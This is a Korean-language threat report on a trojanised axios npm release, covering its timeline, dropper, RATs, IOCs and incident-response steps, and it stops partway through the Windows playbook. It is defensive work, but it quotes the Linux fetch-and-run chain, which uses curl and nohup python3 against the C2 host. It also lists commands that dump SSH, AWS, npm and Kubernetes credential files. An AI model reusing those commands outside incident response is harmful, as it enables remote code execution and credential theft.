# Axios npm 공급망 공격 종합 분석 보고서

**작성일:** 2026-04-01  
**분류:** TLP:WHITE (공개 출처 기반)  
**버전:** 1.1 (Hunt.io, Endor Labs 내용 반영)  
**분석 기반:** Elastic Security Labs, StepSecurity, SafeDep, Socket, OX Security, Snyk, SANS Institute, Sophos, The Hacker News, BleepingComputer, Nextgov, CyberScoop, **Hunt.io**, **Endor Labs** 외

---

## ⚡ 먼저 읽어야 할 핵심 답변

> **"axios 악성 버전을 설치했다면 내 시스템은 감염되는가, 재부팅 후에도 살아남는가?"**

| 환경 | 즉시 감염? | RAT 바이너리 디스크 잔존? | 자동 Persistence? | C2 통해 추가 작업 가능? | 위험도 |
|---|:---:|:---:|:---:|:---:|:---:|
| **Windows** (직접 실행) | ✅ | ✅ 잔존 | ✅ **자동** (Registry Run 키) | ✅ | 🔴 높음 |
| **macOS** (직접 실행) | ✅ | ✅ **잔존하며 실행 중** | ❌ 없음 | ✅ | 🟠 높음 |
| **Linux** (직접 실행) | ✅ | ✅ **잔존하며 실행 중** | ❌ 없음 | ✅ | 🟠 중간 |
| **Docker** (컨테이너 내부) | ✅ 컨테이너 내 | ✅ 컨테이너 내 잔존 | ❌ 없음 | ✅ | 🟡 중간 |
| **Docker → macOS 호스트** | ❌ | ❌ | ❌ | ❌ | 🟢 낮음 |

> ⚠️ **"자동 Persistence 없음"의 의미를 오해하지 말 것**
>
> macOS와 Linux에서 "Persistence 없음"은 **RAT이 자동으로 재시작 등록을 하지 않는다**는 뜻이다. **바이너리 자체는 삭제되지 않고 디스크에 남아 프로세스로 실행 중이다.**
>
> - `setup.js` (dropper): ✅ 자체 삭제됨
> - `/Library/Caches/com.apple.act.mond` (macOS RAT): ❌ **삭제 안 됨, 살아있는 프로세스**
> - `/tmp/ld.py` (Linux RAT): ❌ **삭제 안 됨, nohup으로 백그라운드 실행 중**
>
> 재부팅 전까지 RAT은 C2와 통신하며 공격자 명령을 기다린다. 이 시간 동안 공격자는 LaunchAgent 등록, crontab 추가, 추가 바이너리 드롭 등 **2단계 persistence를 수동으로 배포할 수 있다.** 노출 창이 3시간이었고, 고가치 타겟이라면 충분히 현실적인 시나리오다.
>
> **재부팅 후 안심은 금물. 자격증명은 이미 설치 시점에 전송되었다.**

---

## Executive Summary

2026년 3월 30~31일 (UTC) 사이, 공격자는 axios npm 패키지의 메인테이너 계정(`jasonsaayman`)을 침해하여 트로이목마가 삽입된 두 개의 악성 버전(`axios@1.14.1`, `axios@0.30.4`)을 배포했다. 악성 버전은 `plain-crypto-js@4.2.1`이라는 위장 의존성을 주입하며, 이 패키지의 `postinstall` 훅이 OS를 감지해 플랫폼별 2단계 RAT(Remote Access Trojan)을 실행한다.

주당 1억 회 이상 다운로드되는 패키지의 특성상 블라스트 반경이 매우 크며, 악성 버전은 약 3시간 동안 npm 레지스트리에서 활성화 상태였다. Google Threat Intelligence Group은 이 공격을 북한 연계 위협 클러스터 **UNC1069**로 귀속했다.

**핵심 질문 결론:**

| 시나리오 | 결론 |
|---|---|
| Docker 내부에서 `npm install` → macOS 호스트 감염 | **불가** (Docker escape 코드 없음) |
| Docker 내부에서 지속 가능한 백도어 여부 | **컨테이너 재시작 전까지만** (자체 persistence 없음) |
| macOS에서 직접 `npm install` 실행 | **직접 감염** (자격증명 즉시 탈취 위험) |

---

## 1. 공격 타임라인

공격자는 "신규 패키지" 휴리스틱 탐지를 회피하기 위해 clean decoy 버전을 먼저 등록하는 사전 준비 전략을 사용했다. 두 개의 axios 릴리즈 브랜치(latest, legacy)를 39분 이내에 동시 침해하여 최대 노출 범위를 확보했다.

```
2026-03-30 05:57 UTC  plain-crypto-js@4.2.0 공개 (레지스트리 히스토리 위장용 decoy)
2026-03-30 23:59 UTC  plain-crypto-js@4.2.1 공개 (postinstall 백도어 포함)
2026-03-31 00:21 UTC  axios@1.14.1 공개 (latest 태그 — 기본 설치 대상)
2026-03-31 01:00 UTC  axios@0.30.4 공개 (legacy/0.x 태그)
2026-03-31 ~03:15 UTC  악성 axios 버전 unpublish (추정)
2026-03-31 04:26 UTC  plain-crypto-js security-holder stub 교체 (npm 조치)
```

**노출 창:** 약 3시간 (00:21 ~ 03:15 UTC)

**계정 침해 증거:**
- 정상 배포: `jasonsaayman@gmail.com` + GitHub Actions OIDC (SLSA provenance 포함)
- 악성 배포: `ifstap@proton.me` + 직접 CLI publish (SLSA provenance 없음)

이 publisher 이메일 변경 + provenance 부재 조합이 공급망 보안 도구가 감지할 수 있는 유일한 사전 신호였다.

---

## 2. 공격 체인 기술 분석

### 2.1 Stage 1 — Dropper (`setup.js`)

`plain-crypto-js@4.2.1`의 `postinstall` 훅이 `node setup.js`를 자동 실행한다. 사용자 상호작용이 전혀 필요 없다.

**2단계 난독화:**

```
Layer 1: 문자열을 역순으로 뒤집은 후 Base64 디코딩
Layer 2: XOR 암호화
  - 키: OrDeR_7077
  - 위치 공식: digit_index = 7 * i² % 10  (i = 문자 인덱스)
```

Socket 분석에 따르면 복호화 대상 문자열 테이블(`stq[]`)은 18개 핵심 항목으로 구성되며, C2 URL, 모듈명, OS 분기 명령, 파일 경로 등이 포함된다.

**C2 통신 — 플랫폼 분기:**

```
POST http://sfrclak[.]com:8000/6202033

body: packages.npm.org/product0  ← macOS (darwin)
      packages.npm.org/product1  ← Windows (win32)
      packages.npm.org/product2  ← Linux
```

C2 서버는 Express.js 기반이며, POST 요청에만 유효한 페이로드로 응답한다 (SafeDep 확인).

**Anti-forensics:**

실행 완료 후 `setup.js`를 자체 삭제하고 `package.json`을 사전 준비된 clean stub(`package.md`)으로 교체한다. 교체된 `package.json`은 버전을 `4.2.0`으로 리포팅하므로 `npm ls`와 `npm audit` 모두 악성 여부를 탐지하지 못한다.

유일한 포렌식 흔적: `node_modules/plain-crypto-js/` **디렉터리의 존재** — 이 패키지는 어떤 정상 axios 버전에도 의존성으로 포함된 적이 없다.

### 2.2 Stage 2 — 플랫폼별 RAT

세 플랫폼 모두 동일한 C2 프로토콜, 명령 구조, beacon 주기를 공유하는 단일 cross-platform RAT 프레임워크의 플랫폼 네이티브 구현체다.

**공통 네트워크 지표 (전 플랫폼 동일):**

```
User-Agent: mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)
```
macOS, Linux 환경에서 IE8/WinXP UA는 즉시 anomaly 탐지가 가능한 강력한 네트워크 시그니처다.

---

## 3. 플랫폼별 상세 분석

### 3.1 macOS (darwin)

**실행 체인:**

```
os.platform() === 'darwin'
  └─ osascript (AppleScript)
       └─ POST to C2 → Mach-O 바이너리 다운로드
            └─ /Library/Caches/com.apple.act.mond
                 └─ 실행 (C2 URL 인자 전달)
                      └─ C2 beacon 루프 (~60초 주기)
```

**바이너리 특성:**
- C++ 컴파일 Mach-O 바이너리
- Elastic Security Labs가 Mandiant 추적 WAVESHAPER 백도어(UNC1069 귀속)와 코드 오버랩 확인
- Apple-looking 경로(`/Library/Caches/`)에 위장 드롭
- 코드 서명 특성 이상 (dubious signing)

**RAT 기능:**

| 명령 | 기능 |
|---|---|
| `runscript` | 임의 쉘 스크립트 실행 |
| `rundir` | 디렉터리 열거 + 파일 메타데이터 수집 |
| `peinject` | 추가 바이너리/페이로드 드롭 및 실행 |
| beacon | ~60초 주기 C2 polling |

**자체 Persistence:** ❌ 없음 (LaunchAgent/LaunchDaemon 미등록)  
단, RAT의 `runscript`/`peinject` 채널을 통해 공격자가 2단계 persistence를 수동 배포하는 것은 가능하다.

**즉시 노출되는 자격증명 (macOS 개발자 환경 기준):**

```
~/.ssh/                     SSH 개인 키
~/.aws/credentials          AWS 자격증명
~/.config/                  GCP/Azure 설정
~/.npmrc                    npm 토큰
~/.gitconfig                Git 자격증명
~/Library/Keychains/        macOS 키체인 (접근 가능 범위 내)
.env 파일                   현재 디렉터리 및 상위
환경변수                     GITHUB_TOKEN, CI 토큰 등
```

---

### 3.2 Linux (컨테이너 포함)

**실행 체인:**

```
os.platform() === 'linux'
  └─ /bin/sh
       └─ curl http://sfrclak[.]com:8000/6202033 → /tmp/ld.py
            └─ nohup python3 /tmp/ld.py http://sfrclak[.]com:8000/6202033 > /dev/null 2>&1 &
                 └─ C2 beacon 루프 (~60초 주기, 매 beacon마다 전체 시스템 정보 전송)
```

**RAT 기능:** macOS/Windows와 동일한 명령 구조 (`kill`, `runscript`, `rundir`, `peinject`)

> ⚠️ **`peinject` 명령 버그**: `ijtbin` 파라미터 대신 미정의 변수 `b64_string`을 참조 → 매번 `NameError` 크래시. Windows 코드베이스에서 급하게 포팅하면서 발생한 버그. 단, `runscript`(`shell=True`)로 동일한 임의 코드 실행 가능.

**자체 Persistence:** ❌ 없음 (cron/systemd 미등록)

**Linux RAT 고유 특징:** 자신의 프로세스 목록에 `*` 접두어를 붙여 공격자가 쉽게 식별 가능하게 표시.

---

### 3.3 Windows (win32)

**실행 체인:**

```
os.platform() === 'win32'
  └─ VBScript (%TEMP%\6202033.vbs) + %PROGRAMDATA%\wt.exe (rename된 PowerShell)
       └─ PowerShell RAT 페이로드 실행 (fileless, 메모리에서만 동작)
            └─ .NET Reflection으로 DLL 로드 (Extension.SubRoutine.Run2 invoke)
                 └─ C2 beacon 루프 (첫 beacon Full 정보, 이후 timestamp만)
```

**자체 Persistence:** ✅ 있음
- Registry Run 키: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate` → `C:\ProgramData\system.bat`
- 숨겨진 배치 파일 `system.bat` (265 bytes): 재부팅 시 C2에서 RAT을 메모리로 직접 다운로드-실행 (완전 fileless)
- RAT 코드는 재부팅 후 디스크에 기록되지 않음 → 파일 기반 탐지 우회

**첫 실행 시 즉시 탈취 데이터 (공격자 명령 없이 자동):**
- POST #1 (~33KB): Documents, Desktop, OneDrive, AppData, 전체 드라이브 루트 파일 목록 (파일명, 크기, 타임스탬프)
- POST #2 (~7KB): 호스트명, 사용자명, OS 버전, CPU, 타임존, 부팅 시간, 전체 프로세스 목록 (PID + 실행 경로)

**추가 Windows 아티팩트:**
- `%LOCALAPPDATA%\Microsoft\CLR_v4.0\UsageLogs\wt.exe.log` — .NET 어셈블리 로드 흔적

---

### 3.4 C2 공통 프로토콜

세 플랫폼 모두 동일한 JSON 프로토콜을 사용한다.

**C2 명령 (공격자 → RAT):**

| 명령 | Type 필드 | 기능 |
|---|---|---|
| `kill` | `"kill"` | RAT 프로세스 종료 후 C2에 확인 전송 |
| `peinject` | `"peinject"` | Base64 바이너리 드롭 후 실행 (Linux는 버그로 broken) |
| `runscript` | `"runscript"` | 임의 스크립트/셸 명령 실행 |
| `rundir` | `"rundir"` | 파일시스템 디렉터리 탐색 + 메타데이터 반환 |

**상태 코드:**

| 코드 | 의미 |
|---|---|
| `"Wow"` | 성공 |
| `"Zzz"` | 실패 (에러 메시지 포함) |
| `"success"` | kill 명령 ACK 전용 |

**Beacon 타입:**

| 타입 | 전송 시점 | 내용 |
|---|---|---|
| `FirstInfo` | 최초 1회 | 세션 UID, OS 식별자, 디렉터리 목록 |
| `BaseInfo` | 60초마다 | 시스템 정보 + heartbeat (Windows는 이후 timestamp만) |
| `CmdResult` | 명령 실행 후 | 상태 코드(Wow/Zzz) + 출력 |

---

### 3.5 플랫폼별 요약 비교

| 항목 | macOS | Linux | Windows |
|---|---|---|---|
| 페이로드 | Mach-O C++ 바이너리 (657KB, x86_64+arm64 universal) | Python 스크립트 (12KB, stdlib only) | PowerShell (11KB, fileless) |
| 드롭 경로 | `/Library/Caches/com.apple.act.mond` | `/tmp/ld.py` | `%PROGRAMDATA%\wt.exe` |
| 자체 Persistence | ❌ 없음 | ❌ 없음 | ✅ `MicrosoftUpdate` Run 키 + `system.bat` |
| Gatekeeper/실행 우회 | `codesign --force --deep --sign -` | 없음 | PowerShell `-ep bypass`, VBScript hidden |
| peinject | ✅ 동작 (ad-hoc 서명 후 실행) | ❌ **버그로 broken** | ✅ .NET Reflection (완전 fileless) |
| Beacon 최적화 | 첫 번째만 Full | **매번 Full** (미최적화) | 첫 번째만 Full |
| 정교함 | 최고 (NukeSped/WAVESHAPER) | 중간 (버그 존재) | 중간-높음 |

---

## 4. Docker 환경 심층 평가

### 4.1 macOS 호스트 감염 여부

**결론: 표준 Docker 환경에서 macOS 호스트 직접 감염 불가**

Docker Linux 컨테이너 내부에서 `npm install`을 실행하면 `os.platform()`이 `linux`를 반환한다. 따라서 dropper는 macOS Mach-O가 아닌 Linux Python RAT(`/tmp/ld.py`)를 내려받는다. 공개된 모든 분석 문서(Elastic, StepSecurity, SafeDep, Socket)에서 Docker escape exploit 코드는 확인되지 않았다.

Linux 실행 체인은 `node → sh → curl → nohup python3` 구조로, 커널/VM escape가 없는 단순 실행 및 백그라운드 처리다.

**단, 다음 설정에서는 macOS 호스트 피해 가능:**

| Docker 설정 | 위험 이유 | 결과 |
|---|---|---|
| SSH키·클라우드 자격증명 bind-mount | Linux RAT이 임의 쉘 스크립트 실행 + 사용자 경로 열거 가능 | macOS escape 없이도 자격증명 탈취 |
| `/var/run/docker.sock` 컨테이너 노출 | Docker API 직접 접근 가능 | 호스트 컨테이너 생성 등 피벗 가능 |
| `--privileged` 플래그 사용 | 호스트 커널 접근 가능 | escape 가능성 |
| `-v /:/host` 루트 마운트 | 호스트 전체 파일시스템 접근 | 직접 파일 탈취 |

위 설정들은 악성코드의 명시적 기능이 아닌 **설정 misconfiguration 기반 위험**이다. 공격자가 이를 의도한 것으로 확인된 근거는 없다.

### 4.2 Docker 내부 지속 백도어 여부

**결론: 컨테이너 재시작 전까지만 활성, 자체 persistence 없음**

Linux RAT은 `nohup python3 /tmp/ld.py &`로 백그라운드에서 실행되며, 약 60초 주기로 C2에 beacon을 전송한다. 컨테이너가 살아있는 동안은 완전히 동작하는 인터랙티브 백도어로 기능한다.

**컨테이너 유형별 생존 조건:**

| 컨테이너 유형 | RAT 생존 여부 | 비고 |
|---|---|---|
| Ephemeral build 컨테이너 | 빌드 완료까지만 | 단시간이라도 C2 콜백 발생 |
| Long-lived dev 컨테이너 | 컨테이너 재시작 전까지 | 공격자 지속 접근 가능 |
| Named volume 마운트 컨테이너 | `ld.py` volume 잔존 가능 | 단, `nohup` 재실행은 별도 필요 |
| 재시작 후 동일 이미지 재실행 | 재감염됨 (lockfile 미수정 시) | `node_modules/` 포함 이미지라면 재감염 |

**공격자의 2단계 persistence 배포 가능성:**  
RAT의 `runscript` 채널을 통해 공격자가 수동으로 cron 등록, 추가 바이너리 드롭 등을 실행할 수 있다. 노출 창 3시간 동안 Wiz 보고에 따르면 공격자는 TruffleHog로 탈취 자격증명을 즉시 검증하고 AWS IAM/EC2/S3 정찰을 수행했다. 고가치 타겟 컨테이너라면 이 시간 내 2단계 조치가 현실적이다.

### 4.3 Docker vs macOS 직접 실행 위험도 비교

| 항목 | Docker 내부 실행 | macOS 직접 실행 |
|---|---|---|
| 페이로드 | Linux Python RAT | macOS C++ Mach-O (WAVESHAPER 계열) |
| 자격증명 접근 범위 | 컨테이너 내 마운트된 것만 | 개발자 전체 환경 |
| 호스트 직접 감염 | ❌ (표준 설정 시) | ✅ 즉시 감염 |
| 자체 Persistence | ❌ | ❌ (단, 2단계 가능) |
| 위험도 | 중간 (설정 따라 달라짐) | **높음** |
| 탐지 방법 | 컨테이너 내 프로세스/네트워크 모니터링 | Endpoint EDR |

---

## 5. IOC (Indicators of Compromise)

### 5.1 악성 패키지

| 패키지 | 버전 | 상태 |
|---|---|---|
| `axios` | `1.14.1` | 악성 (latest 태그였음) |
| `axios` | `0.30.4` | 악성 (legacy 태그였음) |
| `plain-crypto-js` | `4.2.1` | 악성 (postinstall 백도어) |
| `@shadanai/openclaw` | `2026.3.28-2` 외 | 동일 페이로드 배포 |
| `@qqbrowser/openclaw-qbot` | `0.0.130` | 변조된 axios@1.14.1 포함 |

**안전 버전:** `axios@1.14.0` (SLSA provenance 포함), `axios@0.30.3`

### 5.2 파일 아티팩트

| OS | 경로 |
|---|---|
| macOS | `/Library/Caches/com.apple.act.mond` |
| Linux | `/tmp/ld.py` |
| Windows | `%PROGRAMDATA%\wt.exe` |

### 5.3 네트워크

| 유형 | 값 |
|---|---|
| C2 도메인 | `sfrclak[.]com:8000` |
| **연관 도메인** | **`callnrwise[.]com`** (sfrclak.com 등록 53분 전, 동일 IP, Dynadot 등록 — 이중화 C2) |
| C2 IP | `142.11.206.73` (Hostwinds AS54290, Dallas TX) |
| C2 호스트명 | `hwsrv-1320779.hostwindsdns.com` |
| C2 등록일 | 2026-03-30 16:03 UTC (첫 악성 axios 배포 8시간 전) |
| C2 엔드포인트 | `http://sfrclak[.]com:8000/6202033` |
| POST body (macOS) | `packages.npm.org/product0` |
| POST body (Windows) | `packages.npm.org/product1` |
| POST body (Linux) | `packages.npm.org/product2` |
| RAT User-Agent | `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)` |

### 5.4 파일 해시 (SHA-1 / SHA-256)

| 파일 | SHA-1 | SHA-256 | AV 탐지 |
|---|---|---|---|
| `axios@1.14.1` tarball | `2553649f232204966871cea80a5d0d6adc700ca` | `5bb67e88846096f1f8d42a0f0350c9c46260591567612ff9af46f98d1b7571cd` | 1/76 (Kaspersky) |
| `axios@0.30.4` tarball | `d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71` | `59336a964f110c25c112bcc5adca7090296b54ab33fa95c0744b94f8a0d80c0f` | — |
| `plain-crypto-js@4.2.1` tarball | `07d889e2dadce6f3910dcbc253317d28ca61c766` | `58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668` | 3/76 |
| `setup.js` (Stage 1 dropper) | — | `e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09` | 1/76 (Tencent) |
| `com.apple.act.mond` (macOS RAT) | — | `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` | **11/76** |
| Stage 2 PS1 RAT (Windows) | `617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101` | 동일 | **16/76** |
| `system.bat` (Windows persistence) | `f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd` | 동일 | 3/76 (ESET, Kaspersky, Tencent) |
| `wt.exe` (정상 PowerShell 복사본) | — | `9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f` | 0/76 (정상 MS 바이너리) |
| `ld.py` (Linux RAT) | `fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf` | 동일 | 1/76 |
| `axios@1.14.0` (안전) | `7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb` | — | — |
| `axios@0.30.3` (안전) | `ab1be887a2d37dd9ebc219657704180faf2c4920` | — | — |

> **주목:** setup.js와 Linux RAT의 AV 탐지율이 1/76으로 매우 낮다. 실시간 AV에 의존한 탐지는 사실상 불가능에 가깝다. macOS Mach-O RAT이 11/76으로 그나마 높은 편이다.

---

## 6. 탐지 방법

### 6.1 Lockfile 우선 탐지 (가장 신뢰도 높음)

`npm ls`와 `npm audit`은 anti-forensics으로 인해 신뢰할 수 없다. **Lockfile**이 가장 정직한 증거다.

```bash
# package-lock.json, pnpm-lock.yaml, yarn.lock 검사
rg "axios@1\.14\.1|axios@0\.30\.4|plain-crypto-js@4\.2\.1|plain-crypto-js" \
   package-lock.json pnpm-lock.yaml yarn.lock 2>/dev/null

# node_modules 디렉터리 존재 확인 (anti-forensics 우회 핵심)
ls node_modules/plain-crypto-js/
# 이 디렉터리가 존재하면 dropper가 실행된 것 — npm ls 결과와 무관하게 감염 증거
```

### 6.2 macOS 호스트 탐지

```bash
# 아티팩트 존재 여부
ls -la /Library/Caches/com.apple.act.mond 2>/dev/null

# 코드 서명 검사
codesign -dv --verbose=4 /Library/Caches/com.apple.act.mond 2>/dev/null

# 프로세스 확인
ps auxww | grep -iE "act\.mond|osascript"

# 네트워크 연결
lsof -i :8000
netstat -an | grep 142.11.206.73

# 2단계 Persistence 확인
ls ~/Library/LaunchAgents/
ls /Library/LaunchAgents/
crontab -l
```

### 6.3 Linux / Docker 컨테이너 탐지

```bash
# 아티팩트 확인
ls -la /tmp/ld.py 2>/dev/null

# 프로세스 확인
ps auxww | grep "python3 /tmp/ld"

# 네트워크 확인
ss -plant 2>/dev/null | grep -E ":8000|sfrclak"

# User-Agent 네트워크 탐지 (컨테이너 외부에서)
tcpdump -A -i any | grep -i "msie 8.0"
```

### 6.4 CI/CD 파이프라인 탐지

```bash
# 빌드 로그에서 노출 시간대 npm install 확인
# 노출 창: 2026-03-31 00:21 ~ 03:15 UTC

# GitHub Actions 로그에서 의심 네트워크 연결 확인
# sfrclak.com:8000 outbound 연결 존재 여부
```

### 6.5 SLSA Provenance 확인

```bash
# 안전한 버전은 SLSA provenance 포함
npm info axios@1.14.0 dist.integrity
# 악성 버전은 CLI 직접 publish + Proton 이메일 (provenance 없음)
```

---

## 7. 감염 확정 시 OS별 대응 플레이북

> **전제:** 이 섹션은 감염이 확정된 상황을 가정한다. 탐지 전에 읽는다면 6절을 먼저 참조할 것.
> 모든 OS 공통으로 **가장 먼저 할 일은 네트워크 격리**다. RAT이 살아있는 동안 공격자는 계속 명령을 내릴 수 있다.

---

### 7.0 공통 — 즉시 수행 (OS 무관)

```bash
# 1. C2 차단 (hosts 파일 또는 방화벽)
# macOS/Linux
echo "0.0.0.0 sfrclak.com" | sudo tee -a /etc/hosts

# 2. npm 안전 버전으로 즉시 교체
npm install axios@1.14.0 --save-exact

# 3. plain-crypto-js 제거
rm -rf node_modules/plain-crypto-js
```

**자격증명 로테이션 대상 (감염된 머신에서 접근 가능했던 모든 것):**

| 자격증명 유형 | 로테이션 방법 |
|---|---|
| AWS Access Key | IAM 콘솔 → 해당 키 비활성화 후 신규 발급 |
| GitHub Token (PAT) | Settings → Developer settings → 토큰 revoke |
| npm token | `npm token revoke <token>` |
| SSH 개인 키 | 신규 키페어 생성 후 `~/.ssh/authorized_keys` 갱신 |
| GCP Service Account | IAM → 키 삭제 후 신규 발급 |
| `.env` 파일 내 시크릿 | 해당 서비스별 콘솔에서 개별 로테이션 |

---

### 7.1 macOS 대응 플레이북

#### Step 1. RAT 프로세스 즉시 종료

```bash
# RAT 프로세스 확인
ps auxww | grep -E "act\.mond|osascript"

# PID 확인 후 강제 종료
sudo kill -9 $(pgrep -f "act.mond")
sudo kill -9 $(pgrep -f "osascript")
```

#### Step 2. RAT 바이너리 삭제

```bash
# 메인 아티팩트 삭제
sudo rm -f /Library/Caches/com.apple.act.mond

# 삭제 확인
ls -la /Library/Caches/com.apple.act.mond 2>/dev/null && echo "STILL EXISTS" || echo "REMOVED"
```

#### Step 3. 2단계 Persistence 전수 조사 및 제거

공격자가 RAT 채널을 통해 수동으로 심었을 수 있는 persistence를 모두 확인한다.

```bash
# --- LaunchAgent (사용자 레벨) ---
ls -la ~/Library/LaunchAgents/
# 의심스러운 항목 확인 (Apple 공식 항목 외 등록된 것)
# 제거 방법:
# launchctl unload ~/Library/LaunchAgents/<suspicious.plist>
# rm ~/Library/LaunchAgents/<suspicious.plist>

# --- LaunchDaemon (시스템 레벨, root 필요) ---
ls -la /Library/LaunchDaemons/
ls -la /Library/LaunchAgents/
# 제거 방법:
# sudo launchctl unload /Library/LaunchDaemons/<suspicious.plist>
# sudo rm /Library/LaunchDaemons/<suspicious.plist>

# --- crontab ---
crontab -l
sudo crontab -l  # root crontab

# --- Login Items ---
# System Settings → General → Login Items 에서 수동 확인

# --- 숨겨진 바이너리 (RAT이 /tmp에 추가 드롭했을 수 있음) ---
ls -la /tmp/.*  2>/dev/null
find /tmp -name ".*" -type f 2>/dev/null

# --- /Library/Caches 내 의심 파일 전체 확인 ---
ls -la /Library/Caches/ | grep -v "com.apple\|homebrew\|pip"
```

#### Step 4. 탈취 가능 자격증명 전수 확인

```bash
# SSH 키 목록
ls -la ~/.ssh/
# → 모든 private key에 대해 신규 발급 및 서버 authorized_keys 갱신

# AWS
cat ~/.aws/credentials
cat ~/.aws/config
# → IAM 콘솔에서 해당 Access Key 즉시 비활성화

# npm 토큰
cat ~/.npmrc
# → npmjs.com에서 토큰 revoke

# GCP
ls ~/.config/gcloud/
# → gcloud auth revoke --all 후 재인증

# git 자격증명
cat ~/.gitconfig
git config --global credential.helper  # 저장된 credential helper 확인
# macOS Keychain에 저장된 git 자격증명 삭제
security delete-internet-password -s github.com

# 환경변수 (현재 셸)
env | grep -iE "token|key|secret|pass|credential"
```

#### Step 5. 시스템 무결성 확인

```bash
# 최근 24시간 내 생성/수정된 파일 확인
find / -newer /tmp -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev" | head -50

# 네트워크 연결 이력 (Little Snitch 등 방화벽 로그 확인)
# macOS 기본 도구로는:
log show --predicate 'process == "curl" OR process == "python3"' \
  --last 24h 2>/dev/null | head -100
```

#### Step 6. 재감염 방지 후 복구

```bash
# node_modules 완전 초기화
rm -rf node_modules package-lock.json
npm install  # 이 시점에는 이미 npm에서 악성 버전 제거됨

# axios 안전 버전 고정
npm install axios@1.14.0 --save-exact
```

---

### 7.2 Linux 대응 플레이북 (베어메탈 및 VM)

#### Step 1. RAT 프로세스 즉시 종료

```bash
# 프로세스 확인
ps auxww | grep -E "python3 /tmp/ld|nohup python3"

# 종료
kill -9 $(pgrep -f "/tmp/ld.py")

# nohup 관련 잔여 프로세스 확인
jobs -l
```

#### Step 2. RAT 바이너리 및 관련 파일 삭제

```bash
# 메인 아티팩트
rm -f /tmp/ld.py

# RAT이 추가로 드롭했을 숨김 파일
ls -la /tmp/.* 2>/dev/null
find /tmp -name ".*" -o -name "ld.*" 2>/dev/null
rm -f /tmp/.<suspicious_files>

# nohup.out (실행 로그 잔여물)
rm -f ~/nohup.out
```

#### Step 3. 2단계 Persistence 전수 조사 및 제거

```bash
# --- crontab ---
crontab -l
sudo crontab -l
sudo crontab -u root -l

# 의심 항목 발견 시
crontab -e  # 해당 라인 삭제

# --- systemd user service ---
ls ~/.config/systemd/user/
systemctl --user list-units --type=service

# --- systemd system service (root) ---
ls /etc/systemd/system/
ls /lib/systemd/system/
# 의심 서비스 비활성화
# sudo systemctl disable <suspicious.service>
# sudo systemctl stop <suspicious.service>

# --- /etc/rc.local, /etc/profile.d ---
cat /etc/rc.local
ls /etc/profile.d/
cat ~/.bashrc ~/.bash_profile ~/.profile

# --- authorized_keys (공격자가 SSH 키를 추가했을 수 있음) ---
cat ~/.ssh/authorized_keys
sudo cat /root/.ssh/authorized_keys
# 인식할 수 없는 키가 있으면 즉시 삭제
```

#### Step 4. 탈취 가능 자격증명 확인

```bash
# SSH 키
ls -la ~/.ssh/

# AWS
cat ~/.aws/credentials

# 환경변수 (현재 프로세스 및 .bashrc)
env | grep -iE "token|key|secret|pass|credential"
cat ~/.bashrc | grep -iE "export.*token|export.*key|export.*secret"

# Kubernetes config
cat ~/.kube/config  # 클러스터 접근 자격증명 포함
```

#### Step 5. 네트워크 이력 확인

```bash
# 최근 외부 연결 이력
ss -plant
netstat -an | grep ESTABLISHED

# curl/wget 이력 (bash history)
cat ~/.bash_history | grep -E "curl|wget|python"

# 시스템 로그에서 의심 연결
grep "sfrclak\|142.11.206.73" /var/log/syslog 2>/dev/null
grep "sfrclak\|142.11.206.73" /var/log/messages 2>/dev/null
journalctl | grep "sfrclak\|142.11.206.73"
```

---

### 7.3 Docker 컨테이너 대응 플레이북

Docker는 macOS 호스트를 직접 감염시키지 않지만, 컨테이너 내부에서 자격증명이 탈취되었을 수 있다.

#### Step 1. 감염된 컨테이너 즉시 격리 및 종료

```bash
# 실행 중인 컨테이너 목록
docker ps

# 네트워크 격리 (종료 전 포렌식이 필요하다면)
docker network disconnect bridge <container_id>

# 컨테이너 종료
docker stop <container_id>
docker rm <container_id>
```

#### Step 2. 컨테이너 내부 포렌식 (종료 전 수행)

```bash
# 종료 전 컨테이너 내부 상태 수집
docker exec <container_id> ps auxww
docker exec <container_id> ls -la /tmp/
docker exec <container_id> cat /tmp/ld.py 2>/dev/null
docker exec <container_id> ss -plant

# 컨테이너 파일시스템 스냅샷 (포렌식 보존)
docker export <container_id> > container_forensic_$(date +%Y%m%d).tar
```

#### Step 3. 마운트된 자격증명 피해 범위 확정

```bash
# 컨테이너 실행 시 어떤 볼륨이 마운트되었는지 확인
docker inspect <container_id> | jq '.[].Mounts'
docker inspect <container_id> | jq '.[].Config.Env'

# 마운트된 경로 기준으로 탈취 가능 자격증명 식별
# 예시: -v ~/.aws:/root/.aws 가 있었다면 AWS 자격증명 로테이션 필수
```

#### Step 4. 이미지 감염 여부 확인 및 정리

```bash
# node_modules가 이미지에 포함된 경우 이미지 자체도 오염됨
# 해당 이미지로 빌드된 모든 컨테이너가 영향받음
docker images  # 관련 이미지 확인
docker rmi <infected_image_id>

# Dockerfile에서 npm install 시점 확인
# → 노출 창(00:21~03:15 UTC) 중 빌드된 이미지는 전부 재빌드 필요
```

#### Step 5. CI/CD 파이프라인 감사

```bash
# GitHub Actions 기준
# .github/workflows/*.yml 에서 npm install이 포함된 job 확인
# 해당 job이 노출 시간대에 실행되었는지 Actions 탭에서 확인

# 사용된 Runner의 자격증명(GITHUB_TOKEN, secrets.*) 전부 로테이션
# Settings → Secrets and variables → Actions → 개별 시크릿 갱신
```

#### Step 6. 재발 방지 설정

```bash
# Dockerfile에 --ignore-scripts 추가
RUN npm ci --ignore-scripts

# 또는 빌드 시 네트워크 제한
docker build --network=none .  # npm install이 없는 단계에서

# postinstall 차단 .npmrc 설정
echo "ignore-scripts=true" >> .npmrc
```

---

### 7.4 Windows 대응 플레이북

#### Step 1. RAT 프로세스 종료

```powershell
# wt.exe (rename된 PowerShell) 프로세스 확인
